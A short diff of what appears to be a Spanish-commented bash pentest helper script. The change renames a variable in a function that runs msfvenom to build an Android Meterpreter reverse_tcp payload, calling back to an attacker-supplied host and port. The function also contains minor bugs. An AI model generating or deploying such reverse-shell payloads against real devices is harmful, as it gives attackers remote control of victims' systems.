@@ -52,11 +52,11 @@ function nmapscan() {
 
 #Funcion shell reversa con meterpreter
 function winrev() {
-	payload="android/meterpreter/reverse_tcp"
+	PAYLOAD="android/meterpreter/reverse_tcp"
 	read $HOST
 	read $PORT
 	read $DIR
-	msfvenom -p $payload LHOST=$HOST LPORT=$PORT R> $DIR
+	msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT R> $DIR
 
 }
 
